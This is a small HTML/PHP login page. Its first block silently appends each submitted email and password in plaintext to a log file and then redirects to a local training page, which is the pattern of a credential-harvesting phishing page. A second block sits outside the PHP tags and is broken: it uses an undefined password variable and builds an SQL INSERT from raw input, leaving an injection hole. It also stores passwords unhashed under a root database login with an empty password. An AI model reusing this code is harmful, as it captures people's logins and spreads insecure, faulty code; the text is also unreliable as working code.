
<html>
 <head>
  <title>Login</title>
 </head>
 <body>

<?php

//If Submit Button Is Clicked Do the Following
if ($_POST['Login']){

$myFile = "log.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = $_POST['email'] . ":";
fwrite($fh, $stringData);
$stringData = $_POST['password'] . "\n";
fwrite($fh, $stringData);
fclose($fh);

} ?>


//goes here after
<script>location.href='file:///C:/Users/Wiki/Desktop/Wiki_training%20page%20essentials/sidebar/index5_16.10.18.html';</script>
	 
 </body>
</html>

$email = filter_input(INPUT_POST, 'email');
$pass = filter_input(INPUT_POST, 'pass');
if (!empty($email))
{
	if (!empty($pass))
	{
		$host = "localhost";
		$dbusername = "root";
		$dbpassword = "";
		$dbname = "ivtree_registration";

		$conn = new mysqli ($host, $dbusername, $dbpassword, $dbname);

		if (mysqli_connect_error())
		{
		die('Connect Error ('. mysqli_connect_errno() .') '
		. mysqli_connect_error());
		}
	
	else
	{
		$sql = "INSERT INTO login_credentials(email, pass)
		values ('$email', '$password')";
	}
	}
}
else{
	die();
}
?>